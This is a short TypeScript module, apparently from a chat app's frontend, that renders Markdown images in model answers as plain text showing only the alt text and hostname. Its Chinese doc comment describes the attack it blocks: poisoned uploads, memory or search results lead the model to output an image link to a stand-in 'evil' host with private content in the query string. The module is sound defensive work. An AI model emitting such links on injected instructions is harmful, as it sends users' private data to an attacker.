/**
 * 回答里的图片不渲染（P7-S11）。
 *
 * Markdown 图片 `![](url)` 默认会变成 `<img>`，浏览器一加载就向 url 发请求——被投毒的内容（上传文件、记忆、将来的
 * 搜索结果）诱导模型输出 `![](https://evil/?q=私有内容)`，就等于替攻击者发出了请求。`deploy/Caddyfile` 的 CSP 只保护
 * 经反代的部署，直连 8000 端口没有 CSP，所以必须在渲染层兜住。
 *
 * 图片以纯文本呈现：alt 文字 + 目标**主机名**（不含路径与查询串，更不是链接），用户看得出这里原本有张图。
 * 放在独立的 `.ts` 模块里，是因为前端测试用 node strip-types 直跑，不能 import 带 JSX 的组件文件。
 */
export function imageAsText(alt: string | undefined, src: string | undefined): string {
  const label = (alt ?? "").trim() || "图片";
  let host = "";
  try {
    host = src ? new URL(src).hostname : "";
  } catch {
    host = "";
  }
  return host ? `［${label}：外部图片未加载，来源 ${host}］` : `［${label}：图片未加载］`;
}
